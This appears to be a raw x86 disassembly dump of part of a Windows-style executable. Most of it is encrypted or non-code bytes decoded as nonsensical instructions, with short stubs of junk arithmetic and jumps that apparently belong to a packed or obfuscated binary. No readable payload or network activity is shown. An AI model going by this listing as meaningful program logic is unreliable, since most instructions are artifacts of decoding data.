  40960d:	pop    esi
  40960e:	jno    0x409678
  409610:	dec    edx
  409611:	add    BYTE PTR [ebp+0x4a996ace],dh
  409617:	lea    ebx,[edx]
  409619:	lds    edi,FWORD PTR [ecx+0x27]
  40961c:	mov    ds:0xe4eef03c,eax
  409621:	or     al,0xbe
  409623:	mov    dh,0xc0
  409625:	jbe    0x409635
  409627:	mov    esp,0x54d9fed6
  40962c:	adc    edx,DWORD PTR [esi+0x63]
  40962f:	ret    
  409630:	in     al,dx
  409631:	adc    DWORD PTR [eax+0x27],eax
  409634:	xor    ebp,DWORD PTR [eax-0x6eb647c7]
  40963a:	iret   
  40963b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40963c:	out    0x7d,al
  40963e:	stos   DWORD PTR es:[edi],eax
  40963f:	pop    ss
  409640:	pop    esp
  409641:	pop    ebp
  409642:	in     al,dx
  409643:	pop    edi
  409644:	jnp    0x4096a2
  409646:	sub    edx,DWORD PTR gs:[ebx-0x46]
  40964a:	pop    es
  40964b:	xor    ebp,DWORD PTR [esi+0x4d61f5d9]
  409651:	icebp  
  409652:	jp     0x4095f1
  409654:	push   ebx
  409655:	sbb    BYTE PTR [eax],ch
  409657:	mov    BYTE PTR [eax+0x7b],ch
  40965a:	pop    ebp
  40965b:	cmp    DWORD PTR [ecx-0x7d],ebp
  40965e:	jmp    0x5bbcc540
  409663:	mov    ds:0x95249d15,al
  409668:	inc    ebp
  409669:	jl     0x40962d
  40966b:	lods   al,BYTE PTR ds:[esi]
  40966c:	push   ds
  40966d:	imul   esp,DWORD PTR [ebx],0x10249d6
  409673:	cmc    
  409674:	popa   
  409675:	test   al,0xa6
  409677:	inc    ebp
  409678:	push   ds
  409679:	es cmp dh,al
  40967c:	(bad)  [edi-0x3bad378e]
  409682:	cmp    eax,0x71cd3032
  409687:	mov    esi,0xaf50acde
  40968c:	fnstcw WORD PTR [eax+ebx*4]
  40968f:	stos   DWORD PTR es:[edi],eax
  409690:	bound  esp,QWORD PTR [eax+0x27]
  409693:	push   esi
  409694:	les    ecx,FWORD PTR [edx]
  409696:	ja     0x4096bc
  409698:	or     ah,BYTE PTR [edx-0x486ecf8c]
  40969e:	sbb    eax,0xd9dedbca
  4096a3:	sub    esp,edx
  4096a5:	scas   eax,DWORD PTR es:[edi]
  4096a6:	inc    esp
  4096a7:	mov    eax,ds:0xedef71a0
  4096ac:	inc    esp
  4096ad:	icebp  
  4096ae:	dec    esp
  4096af:	test   DWORD PTR [ebp-0x573ace62],eax
  4096b5:	dec    ebx
  4096b6:	xor    esi,DWORD PTR [ebx+0x56]
  4096b9:	jno    0x4096cd
  4096bb:	jae    0x4096ca
  4096bd:	push   es
  4096be:	mov    DWORD PTR [eax],esp
  4096c0:	mov    ebx,0x7c2b5b84
  4096c5:	aad    0xf2
  4096c7:	addr16 mov edx,0x63b1648f
  4096cd:	cld    
  4096ce:	cmp    BYTE PTR [edx-0x20],0x70
  4096d2:	xchg   ecx,eax
  4096d3:	xor    DWORD PTR [ebp-0x54f9fa64],ebp
  4096d9:	loopne 0x409755
  4096db:	es ds cmp al,0x42
  4096df:	test   DWORD PTR [edx-0x53],ecx
  4096e2:	jg     0x4096ff
  4096e4:	out    0xfe,eax
  4096e6:	xor    al,0xb8
  4096e8:	mov    ds:0x7ccf0443,eax
  4096ed:	adc    esp,DWORD PTR [ecx-0x5330cd2e]
  4096f3:	sahf   
  4096f4:	mov    esi,0x944500ed
  4096f9:	or     al,0x51
  4096fb:	mov    BYTE PTR [ecx-0x25],0xe
  4096ff:	add    ebp,eax
  409701:	loopne 0x409722
  409703:	push   edx
  409704:	dec    edx
  409705:	fs ds fmulp st(6),st
  409709:	pop    es
  40970a:	xchg   ecx,eax
  40970b:	push   esp
  40970c:	stos   DWORD PTR es:[edi],eax
  40970d:	push   0x2144140f
  409712:	dec    esi
  409713:	fldenv [eax+ebx*8]
  409716:	cmp    al,0xf0
  409718:	dec    eax
  409719:	or     ebx,DWORD PTR [ebx-0x56]
  40971c:	xchg   DWORD PTR [edi+0x8],ebx
  40971f:	pop    esi
  409720:	jae    0x4096c6
  409722:	mov    ecx,0x3f94823
  409727:	xor    eax,DWORD PTR [edx+0x79]
  40972a:	je     0x40977f
  40972c:	mov    DWORD PTR [eax+edx*8],eax
  40972f:	sub    al,0x60
  409731:	icebp  
  409732:	mov    eax,ds:0x504484f9
  409737:	jmp    0x3176:0x2de500bd
  40973e:	or     ecx,edi
  409740:	xor    BYTE PTR [esi+0x1c],dh
  409743:	mov    al,ds:0x81c34249
  409748:	stc    
  409749:	rol    BYTE PTR [edi],0x15
  40974c:	xor    DWORD PTR [edx+0x322335e6],edx
  409752:	or     ch,bl
  409754:	aaa    
  409755:	inc    edx
  409756:	mov    bh,0x3c
  409758:	mov    ds,WORD PTR [ebx-0x4153ca40]
  40975e:	or     DWORD PTR [ebx],ebx
  409760:	or     ecx,ebp
  409762:	sbb    al,0x11
  409764:	call   0x5795:0x3310b28f
  40976b:	in     eax,0xf8
  40976d:	inc    ebp
  40976e:	in     eax,dx
  40976f:	fcomp  QWORD PTR [ecx]
  409771:	mov    eax,0x1ad42fe
  409776:	mov    cs,edx
  409778:	lds    ebp,FWORD PTR [edx+0xf]
  40977b:	aas    
  40977c:	ret    0xe3f0
  40977f:	xchg   ecx,eax
  409780:	pushf  
  409781:	mov    ds:0x9d2af5da,eax
  409786:	fcmovne st,st(3)
  409788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409789:	mov    ecx,0x3c53b4e2
  40978e:	inc    edi
  40978f:	sti    
  409790:	xchg   ebx,eax
  409791:	ins    DWORD PTR es:[edi],dx
  409792:	out    dx,eax
  409793:	lds    esi,FWORD PTR [eax+0xc]
  409796:	loope  0x4097c1
  409798:	inc    eax
  409799:	gs xchg ebx,eax
  40979b:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40979d:	and    al,0x93
  40979f:	dec    ecx
  4097a0:	stc    
  4097a1:	and    DWORD PTR [edx+eiz*8],edi
  4097a4:	popa   
  4097a5:	jnp    0x409804
  4097a7:	out    dx,al
  4097a8:	retf   
  4097a9:	test   DWORD PTR [edi+0x4f],edi
  4097ac:	adc    al,BYTE PTR [esp+esi*2-0x799a5da]
  4097b3:	nop
  4097b4:	mov    al,0x61
  4097b6:	push   ebx
  4097b7:	sti    
  4097b8:	inc    edi
  4097b9:	fdiv   DWORD PTR [ebx-0x8537818]
  4097bf:	jne    0x40983f
  4097c1:	dec    ecx
  4097c2:	push   esp
  4097c3:	data16 mov dl,0xf9
  4097c6:	xchg   edx,eax
  4097c7:	leave  
  4097c8:	dec    ebp
  4097c9:	int    0x5
  4097cb:	ja     0x409763
  4097cd:	cmc    
  4097ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097cf:	je     0x409800
  4097d1:	push   esi
  4097d2:	lea    ecx,fs:[ecx]
  4097d5:	jecxz  0x4097fd
  4097d7:	xchg   edx,eax
  4097d8:	neg    DWORD PTR [edx-0x13]
  4097db:	or     al,0x2a
  4097dd:	add    ah,al
  4097df:	inc    esp
  4097e0:	jp     0x4097d5
  4097e2:	xor    bh,BYTE PTR [edi-0x336bc75c]
  4097e8:	sbb    eax,0xf538f7cc
  4097ed:	or     cl,BYTE PTR ds:0x571d6fbb
  4097f3:	in     al,dx
  4097f4:	arpl   WORD PTR [edx-0x72],bx
  4097f7:	xor    BYTE PTR [ebp-0x5c],dl
  4097fa:	add    al,0x60
  4097fc:	push   edi
  4097fd:	std    
  4097fe:	ds pop ecx
  409800:	fisttp DWORD PTR [ebx+0x5d105edd]
  409806:	xor    BYTE PTR cs:[esi+ecx*1-0x66],0xda
  40980c:	stc    
  40980d:	push   esp
  40980e:	sar    BYTE PTR [ecx-0x66397dd1],0xfd
  409815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409817:	shr    BYTE PTR [ecx],1
  409819:	fidiv  DWORD PTR [ecx]
  40981b:	rcr    dh,cl
  40981d:	mov    BYTE PTR [edx],ch
  40981f:	inc    eax
  409820:	xchg   esi,eax
  409821:	mov    ebx,0x2602d119
  409826:	adc    ecx,DWORD PTR [ecx]
  409828:	jae    0x4097e7
  40982a:	mov    dl,0x5e
  40982c:	loop   0x409886
  40982e:	sub    DWORD PTR [esi+0x74],ecx
  409831:	scas   eax,DWORD PTR es:[edi]
  409832:	dec    ecx
  409833:	jo     0x4097cc
  409835:	test   BYTE PTR [ebx-0x3cc40bbb],0xf
  40983c:	test   dh,ch
  40983e:	lock (bad) 
  409840:	dec    DWORD PTR [ebx+0x8bf845]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x43385f
  40986f:	xor    DWORD PTR ds:0x433797,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x43385b,0x43382b
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x4337e7,0x433893
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x43377b
  4098a6:	sub    DWORD PTR ds:0x43385f,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	dec    edx
  4098c1:	fidivr DWORD PTR [eax+0x7c]
  4098c4:	mov    ah,0xd9
  4098c6:	jle    0x409946
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	cs cwde 
  4098ce:	push   eax
  4098cf:	cdq    
  4098d0:	aas    
  4098d1:	lahf   
  4098d2:	out    0xef,eax
  4098d4:	and    bh,al
  4098d6:	test   BYTE PTR [esi-0x50745612],dl
  4098dc:	aam    0xd
  4098de:	mov    edi,0x3c08b1d5
  4098e3:	test   BYTE PTR ds:0x75c88ba4,bl
  4098e9:	lods   al,BYTE PTR ds:[esi]
  4098ea:	pop    ds
  4098eb:	jle    0x409874
  4098ed:	addr16 pusha 
  4098ef:	(bad)  
  4098f1:	cmp    al,0xa4
  4098f3:	cmp    ebp,edi
  4098f5:	call   0x4370ec5f
  4098fa:	push   ebx
  4098fb:	(bad)  
  4098fc:	stos   DWORD PTR es:[edi],eax
  4098fd:	das    
  4098fe:	mov    eax,ds:0xbdd4b588
  409903:	dec    edi
  409904:	stc    
  409905:	or     dh,dl
  409907:	sub    edx,DWORD PTR [edx+0x50]
  40990a:	pop    edx
  40990b:	or     BYTE PTR [edx+0x40],dh
  40990e:	adc    edx,DWORD PTR [eax-0x44]
  409911:	(bad)  
  409912:	mov    edx,0x789239be
  409917:	push   eax
  409918:	mov    ch,0xd1
  40991a:	inc    esp
  40991b:	xor    cl,BYTE PTR ds:0xb2030fa
  409921:	push   cs
  409922:	outs   dx,BYTE PTR ds:[esi]
  409923:	fisub  DWORD PTR [eax+eiz*8+0x733968a4]
  40992a:	cdq    
  40992b:	repnz rcr DWORD PTR [esi],cl
  40992e:	xchg   edx,eax
  40992f:	fmul   QWORD PTR [ebx+eax*1-0x7d7c18b0]
  409936:	adc    BYTE PTR [eax-0x3b1aefe],al
  40993c:	repz xchg ebp,eax
  40993e:	out    0xdb,eax
  409940:	daa    
  409941:	push   esp
  409942:	mov    bl,0x79
  409944:	push   edx
  409945:	fisttp QWORD PTR [eax+0x5aaa374c]
  40994b:	(bad)  
  40994c:	pop    ecx
  40994d:	ja     0x4099a2
  40994f:	xlat   BYTE PTR ds:[ebx]
  409950:	dec    edi
  409951:	adc    BYTE PTR [esi+0x4],cl
  409954:	cmc    
  409955:	jmp    0xdfc4:0xcfeed74a
  40995c:	neg    BYTE PTR [ebp-0x3c]
  40995f:	xor    bl,dl
  409961:	xlat   BYTE PTR ds:[ebx]
  409962:	pop    esi
  409963:	mov    ebx,?
  409965:	mov    ebp,DWORD PTR [ecx-0x4e]
  409968:	test   DWORD PTR [edx-0x61],edx
  40996b:	add    eax,0x5b633ecf
  409970:	and    al,0xa1
  409972:	xor    bl,BYTE PTR [edi-0xbeccd90]
  409978:	or     eax,0xedd7324b
  40997d:	loope  0x409998
  40997f:	mov    al,BYTE PTR [ebx+ebp*4-0x4a3d0543]
  409986:	push   ecx
  409987:	xchg   esp,eax
  409988:	push   0xffffff81
  40998a:	pop    eax
  40998b:	cwde   
  40998c:	popf   
  40998d:	xchg   ecx,eax
  40998e:	lock push ebx
  409990:	fs data16 (bad) 
  409993:	(bad)  
  409994:	enter  0x9dba,0x6e
  409998:	in     eax,0x80
  40999a:	or     al,0x8
  40999c:	lods   al,BYTE PTR ds:[esi]
  40999d:	into   
  40999e:	das    
  40999f:	outs   dx,BYTE PTR ds:[esi]
  4099a0:	in     al,0x4a
  4099a2:	pop    edx
  4099a3:	mov    al,0x15
  4099a5:	inc    edi
  4099a6:	ss add al,0x1
  4099a9:	jmp    0x9851:0x699180a7
  4099b0:	jno    0x4099a0
  4099b2:	lods   al,BYTE PTR ds:[esi]
  4099b3:	push   edx
  4099b4:	rcr    BYTE PTR [ecx],0xc0
  4099b7:	sbb    eax,esi
  4099b9:	sub    eax,0x5737ddd
  4099be:	add    edx,DWORD PTR [ebx-0x2e]
  4099c1:	push   cs
  4099c2:	mov    fs,WORD PTR [esi+edi*2+0x3ea1507]
  4099c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099ca:	imul   esi,edi,0x7e
  4099cd:	dec    ebx
  4099ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099cf:	cmp    al,0x7
  4099d1:	aaa    
  4099d2:	mov    dh,0xd7
  4099d4:	mov    ah,0x2f
  4099d6:	xor    DWORD PTR ds:0xbd9ee35e,esi
  4099dc:	test   eax,0x6c224a7c
  4099e1:	hlt    
  4099e2:	push   0xffffffb6
  4099e4:	inc    esi
  4099e5:	ds sbb esp,ebp
  4099e8:	nop
  4099e9:	inc    esi
  4099ea:	mov    ah,0xad
  4099ec:	sub    eax,0xeb2ad7bf
  4099f1:	xchg   edx,eax
  4099f2:	imul   edi,DWORD PTR [eax],0x36
  4099f5:	add    BYTE PTR [edi-0x7a],dh
  4099f8:	cmp    eax,0xf4f5c2a2
  4099fd:	inc    edi
  4099fe:	mov    ecx,0x88a3eb5d
  409a03:	ds adc al,0xac
  409a06:	or     al,0x8d
  409a08:	fdiv   DWORD PTR [eax-0x78]
  409a0b:	and    eax,0xe4a14115
  409a10:	or     BYTE PTR [ebx-0x34],cl
  409a13:	fisub  DWORD PTR [ebp+0xd3e9d29]
  409a19:	cli    
  409a1a:	pop    ss
  409a1b:	mov    eax,ds:0x7fc7adaf
  409a20:	fwait
  409a21:	jp     0x409a39
  409a23:	pop    esi
  409a24:	dec    esi
  409a25:	pusha  
  409a26:	fs mov esi,0x41393c0d
  409a2c:	in     eax,dx
  409a2d:	push   eax
  409a2e:	fucom  st(6)
  409a30:	ins    DWORD PTR es:[edi],dx
  409a31:	inc    eax
  409a32:	jl     0x4099f6
  409a34:	add    al,0xda
  409a36:	mov    edi,0xa3575eeb
  409a3b:	mov    DWORD PTR [edi+0x3a],0x315ae78b
  409a42:	mov    al,ds:0x101256db
  409a47:	loopne 0x4099ed
  409a49:	aam    0xc6
  409a4b:	sti    
  409a4c:	lods   eax,DWORD PTR ds:[esi]
  409a4d:	test   eax,0xffe8c0f5
  409a52:	add    eax,0x67999f6f
  409a57:	xor    al,0xd9
  409a59:	sub    esp,DWORD PTR [eax]
  409a5b:	test   eax,0x84bcbdbf
  409a60:	adc    al,0x93
  409a62:	(bad)  
  409a64:	sbb    DWORD PTR [ebx-0x78],0x7efdba43
  409a6b:	mov    eax,ds:0x6457647a
  409a70:	(bad)  
  409a71:	rcr    BYTE PTR [ecx-0x2a73d12],cl
  409a77:	or     BYTE PTR [ebx],bl
  409a79:	jae    0x409a97
  409a7b:	and    eax,0xf755ef4a
  409a80:	mov    WORD PTR gs:[esi],?
  409a83:	sbb    DWORD PTR [eax],esi
  409a85:	dec    ecx
  409a86:	or     eax,0xc6632b5a
  409a8b:	ja     0x409aab
  409a8d:	or     esi,ecx
  409a8f:	pop    esi
  409a90:	fadd   QWORD PTR [ebp+0x4c8e2e7d]
  409a96:	imul   ecx,DWORD PTR [ebp-0x48c159cd],0x48
  409a9d:	jae    0x409a90
  409a9f:	in     eax,dx
  409aa0:	les    ecx,FWORD PTR [edx+0x1b5af42e]
  409aa6:	aaa    
  409aa7:	xor    eax,0x47ed0ebf
  409aac:	push   0x4af9dc2c
  409ab1:	popa   
  409ab2:	out    dx,eax
  409ab3:	pop    ss
  409ab4:	retf   0x192a
  409ab7:	add    ch,cl
  409ab9:	mov    edi,0xf8e02716
  409abe:	jmp    0x409b3e
  409ac0:	retf   0x79eb
  409ac3:	iret   
  409ac4:	rol    BYTE PTR [edi+0x7e1375c4],cl
  409aca:	inc    ebp
  409acb:	mov    ch,0xb1
  409acd:	sti    
  409ace:	inc    esi
  409acf:	sbb    eax,0xd0a12f09
  409ad4:	idiv   BYTE PTR [edi]
  409ad6:	test   eax,0x37d32ea7
  409adb:	pushf  
  409adc:	loopne 0x409a62
  409ade:	bound  esp,QWORD PTR [ebx]
  409ae0:	inc    ecx
  409ae1:	jl     0x409abe
  409ae3:	lods   al,BYTE PTR ds:[esi]
  409ae4:	sbb    BYTE PTR [ecx+ebp*4+0x0],al
  409ae8:	sbb    DWORD PTR [esi-0x6b6363a3],esi
  409aee:	add    al,0x93
  409af0:	icebp  
  409af1:	jb     0x409ac6
  409af3:	shr    BYTE PTR [edi*2+0x2c4724f1],1
  409afa:	das    
  409afb:	in     eax,0xa3
  409afd:	xor    ecx,DWORD PTR [edi+0x63]
  409b00:	vmwrite eax,DWORD PTR [ecx+ebp*1+0x14]
  409b05:	mov    DWORD PTR [ecx],eax
  409b07:	push   es
  409b08:	mov    eax,0x38d6b094
  409b0d:	push   esp
  409b0e:	sub    eax,0x56f48da4
  409b13:	push   edi
  409b14:	sbb    DWORD PTR ds:0x43381f,0x4337d3
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi-0x1e2fd12c]
  409b32:	or     eax,0x7e7ee47e
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	ds xor eax,0xf7badadc
  409b41:	ja     0x409ba9
  409b43:	pop    ebx
  409b44:	fsub   DWORD PTR [edx]
  409b46:	inc    ecx
  409b47:	mov    cr4,ebp
  409b4a:	idiv   BYTE PTR [ecx]
  409b4c:	push   ds
  409b4d:	cli    
  409b4e:	sahf   
  409b4f:	mov    eax,DWORD PTR [eax+eiz*2]
  409b52:	lds    edx,FWORD PTR [eax+edi*2]
  409b55:	mov    esi,0x743e2a4c
  409b5a:	lock dec esp
  409b5c:	mov    WORD PTR ds:0xcec42181,?
  409b62:	loopne 0x409b1e
  409b64:	push   ecx
  409b65:	(bad)  
  409b66:	adc    al,BYTE PTR [ebx]
  409b68:	in     eax,0x5e
  409b6a:	outs   dx,BYTE PTR ds:[esi]
  409b6b:	aam    0x3f
  409b6d:	scas   eax,DWORD PTR es:[edi]
  409b6e:	jmp    0x870b6c43
  409b73:	jo     0x409bca
  409b75:	inc    edx
  409b76:	jg     0x409b5c
  409b78:	mov    eax,0x813e49a
  409b7d:	retf   0xa561
  409b80:	les    edx,FWORD PTR [ecx+0x510d14c8]
  409b86:	jnp    0x409b3f
  409b88:	loope  0x409b21
  409b8a:	jmp    0x72b3:0xb40c16e8
  409b91:	cli    
  409b92:	add    al,bh
  409b94:	xchg   edi,eax
  409b95:	inc    esp
  409b96:	sahf   
  409b97:	mov    ds:0xfd8e9396,eax
  409b9c:	sub    BYTE PTR [ebp+0x27de8061],bh
  409ba2:	dec    ebx
  409ba3:	pop    DWORD PTR [ebp+0x4c]
  409ba6:	fldcw  WORD PTR [ebx+0x4bbaf45a]
  409bac:	xchg   esp,eax
  409bad:	jo     0x409b3a
  409baf:	dec    ebp
  409bb0:	(bad)  
  409bb1:	es aad 0xb2
  409bb4:	(bad)  
  409bb5:	push   esi
  409bb6:	cmc    
  409bb7:	push   0x5f
  409bb9:	cmp    bh,BYTE PTR [ebx-0x3e]
  409bbc:	stos   DWORD PTR es:[edi],eax
  409bbd:	xor    ebx,ebp
  409bbf:	outs   dx,DWORD PTR ds:[esi]
  409bc0:	fcmovu st,st(2)
  409bc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bc3:	add    edx,ebx
  409bc5:	jmp    0xd2f40e5
  409bca:	mov    bl,0x3d
  409bcc:	loop   0x409bc3
  409bce:	ins    DWORD PTR es:[edi],dx
  409bcf:	in     al,dx
  409bd0:	das    
  409bd1:	(bad)  
  409bd2:	je     0x409bc3
  409bd4:	cmp    dl,dl
  409bd6:	jo     0x409b7e
  409bd8:	xor    ah,BYTE PTR [ecx-0x5c]
  409bdb:	pop    ebx
  409bdc:	sti    
  409bdd:	pushf  
  409bde:	and    eax,0x19023301
  409be3:	(bad)  
  409be4:	out    dx,eax
  409be5:	jnp    0x409c2e
  409be7:	aad    0xf7
  409be9:	jl     0x409c21
  409beb:	dec    edx
  409bec:	sbb    eax,0x184b6818
  409bf1:	loope  0x409c70
  409bf3:	pop    esi
  409bf4:	fld    TBYTE PTR [edi+0x25766a6f]
  409bfa:	cli    
  409bfb:	xchg   esi,eax
  409bfc:	ins    DWORD PTR es:[edi],dx
  409bfd:	int    0xc2
  409bff:	int3   
  409c00:	pop    ss
  409c01:	sbb    BYTE PTR [ebx+0x48],ch
  409c04:	pop    esi
  409c05:	add    dh,BYTE PTR [edx+0x23]
  409c08:	fwait
  409c09:	call   DWORD PTR [edi]
  409c0b:	test   DWORD PTR [edi+0x2b],0xd391bf7b
  409c12:	aam    0x4c
  409c14:	fs loope 0x409c69
  409c17:	and    bl,BYTE PTR [edi+0x377aaac]
  409c1d:	aam    0xfe
  409c1f:	mov    edx,0xf1cd53d0
  409c24:	lods   eax,DWORD PTR ds:[esi]
  409c25:	inc    ebp
  409c26:	inc    esi
  409c27:	xchg   ebp,eax
  409c28:	inc    edi
  409c29:	pop    ecx
  409c2a:	inc    ecx
  409c2b:	lea    edi,[ecx+0x2a]
  409c2e:	imul   ecx,DWORD PTR [esi],0xffffffdf
  409c31:	pop    edx
  409c32:	dec    eax
  409c33:	retf   0xdc9
  409c36:	(bad)  
  409c37:	mov    ds:0x6e3e7a3,al
  409c3c:	call   0xbd12:0x132a0759
  409c43:	xlat   BYTE PTR ds:[ebx]
  409c44:	xchg   ebp,eax
  409c45:	sub    DWORD PTR [esi+0x65],esi
  409c48:	push   ebp
  409c49:	les    eax,FWORD PTR [esi+0x61]
  409c4c:	add    DWORD PTR [esi],ecx
  409c4e:	fbld   TBYTE PTR [ecx]
  409c50:	inc    esi
  409c51:	add    eax,0x55e4f432
  409c56:	or     cl,BYTE PTR [edx+ebx*2-0x11f6e56f]
  409c5d:	cli    
  409c5e:	dec    edx
  409c5f:	retf   
  409c60:	sub    cl,BYTE PTR [esi+0x3d73e21f]
  409c66:	add    al,0x7d
  409c68:	stc    
  409c69:	lods   al,BYTE PTR ds:[esi]
  409c6a:	mov    esp,0x684d8d46
  409c6f:	jmp    0xc215:0xad7a169f
  409c76:	nop
  409c77:	mov    WORD PTR [ecx+0x1e],cs
  409c7a:	(bad)  
  409c7b:	in     al,0xf9
  409c7d:	xchg   ebx,eax
  409c7e:	test   DWORD PTR [eax-0x5],edi
  409c81:	in     eax,0x6c
  409c83:	mov    eax,0xf8ea9515
  409c88:	add    edi,DWORD PTR [ecx]
  409c8a:	les    ebp,FWORD PTR [ebx]
  409c8c:	lea    ebp,[edi-0x68799c0d]
  409c92:	jp     0x409c91
  409c94:	cmc    
  409c95:	ja     0x409c99
  409c97:	in     al,0xe7
  409c99:	adc    ebx,ebp
  409c9b:	out    0x5e,al
  409c9d:	mov    dh,0x4a
  409c9f:	mov    BYTE PTR [ecx-0x6],0x70
  409ca3:	and    eax,0xd3bf8ddb
  409ca8:	jecxz  0x409caf
  409caa:	pop    esi
  409cab:	rcr    DWORD PTR [edi+esi*4+0xb13a025],0x11
  409cb3:	add    bh,cl
  409cb5:	lods   ax,WORD PTR ds:[esi]
  409cb7:	cmp    dl,ah
  409cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cba:	rcr    DWORD PTR [eax+0x67d06fb7],0xe2
  409cc1:	jl     0x409c8b
  409cc3:	jae    0x409cda
  409cc5:	repnz adc BYTE PTR [esi],ah
  409cc8:	das    
  409cc9:	ret    0xfb02
  409ccc:	xor    dh,al
  409cce:	xor    bl,dl
  409cd0:	repnz imul ebp,DWORD PTR [ebx-0x5d023136],0xb0913a44
  409cdb:	sub    eax,0x2aaa121e
  409ce0:	push   ebp
  409ce1:	gs (bad) 
  409ce3:	pop    edi
  409ce4:	mov    ds,edx
  409ce6:	popa   
  409ce7:	mov    DWORD PTR [edx],esp
  409ce9:	pop    edi
  409ceb:	mov    fs,WORD PTR [esi-0x5dfd7fab]
  409cf1:	cmp    edi,edi
  409cf3:	lods   al,BYTE PTR ds:[esi]
  409cf4:	sar    DWORD PTR [esi-0x28],0xac
  409cf8:	lods   eax,DWORD PTR ds:[esi]
  409cf9:	pop    ecx
  409cfa:	imul   ebx,DWORD PTR [edx+0x46b21489],0x29a12c29
  409d04:	and    eax,0x311cb624
  409d09:	sbb    DWORD PTR [edi],eax
  409d0b:	jno    0x409d31
  409d0d:	jg     0x409caa
  409d0f:	adc    esp,DWORD PTR [eax+ebx*8-0x50]
  409d13:	jo     0x409c9b
  409d15:	(bad)  
  409d16:	dec    eax
  409d17:	inc    ebx
  409d18:	ret    
  409d19:	or     ebp,ecx
  409d1b:	imul   edx,DWORD PTR [eax+0x22],0x7dbf6c6f
  409d22:	xchg   esi,eax
  409d23:	sub    DWORD PTR [edx],edx
  409d25:	rdseed edx
  409d28:	rol    BYTE PTR [edx+0x7b],cl
  409d2b:	jne    0x409cea
  409d2d:	xchg   esp,eax
  409d2e:	popa   
  409d2f:	sti    
  409d30:	das    
  409d31:	xchg   ebx,eax
  409d32:	int3   
  409d33:	sbb    al,0xcd
  409d35:	and    esi,ebx
  409d37:	sub    BYTE PTR [ecx+0x75],bl
  409d3a:	cmc    
  409d3b:	ja     0x409ccd
  409d3d:	cmp    al,0xb0
  409d3f:	or     esp,eax
  409d41:	ret    0xffb5
  409d44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d45:	adc    BYTE PTR [edx+0x7e040fa9],ch
  409d4b:	ficom  DWORD PTR [ebx]
  409d4d:	cdq    
  409d4e:	mov    al,ds:0x654a6209
  409d53:	lea    esi,[eax+0x66]
  409d56:	in     eax,dx
  409d57:	ds std 
  409d59:	pop    ebx
  409d5a:	repnz cmp eax,0xee0ff322
  409d60:	rcl    DWORD PTR [esi+edi*2+0x8cf2a7b],1
  409d67:	pop    edx
  409d68:	push   cs
  409d69:	in     eax,0x7
  409d6b:	and    al,0xa7
  409d6d:	xchg   BYTE PTR [edi],cl
  409d6f:	push   eax
  409d70:	in     al,dx
  409d71:	lds    eax,FWORD PTR [esi+0x27]
  409d74:	xchg   BYTE PTR [edx+0x3],dh
  409d77:	or     dh,BYTE PTR [ecx-0x6911b56e]
  409d7d:	lahf   
  409d7e:	clc    
  409d7f:	cmp    al,0x7e
  409d81:	test   ecx,ecx
  409d83:	mov    DWORD PTR ds:0x433797,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43378b
  409d9c:	sub    DWORD PTR ds:0x43385f,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x4337d3,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	adc    al,BYTE PTR [edi]
  409dc0:	outs   dx,BYTE PTR ds:[esi]
  409dc1:	jge    0x409dfb
  409dc3:	loop   0x409e43
  409dc5:	jle    0x409dff
  409dc7:	jl     0x409e47
  409dc9:	jle    0x409dcb
  409dcb:	add    ah,BYTE PTR [ecx-0x31]
  409dce:	cld    
  409dcf:	or     edi,DWORD PTR [esi-0xf]
  409dd2:	pop    edx
  409dd3:	ret    
  409dd4:	jbe    0x409dad
  409dd6:	into   
  409dd7:	(bad)  
  409dd9:	pop    esp
  409dda:	sbb    DWORD PTR [ecx+0x1e],0x3f
  409dde:	je     0x409d74
  409de0:	inc    ebp
  409de1:	cmp    al,0x9a
  409de3:	iret   
  409de4:	mov    al,ds:0x3714dcf5
  409de9:	icebp  
  409dea:	add    edx,DWORD PTR [ecx+ecx*1+0x31b3b752]
  409df1:	sub    edx,DWORD PTR [ebp+0x34]
  409df4:	pop    edx
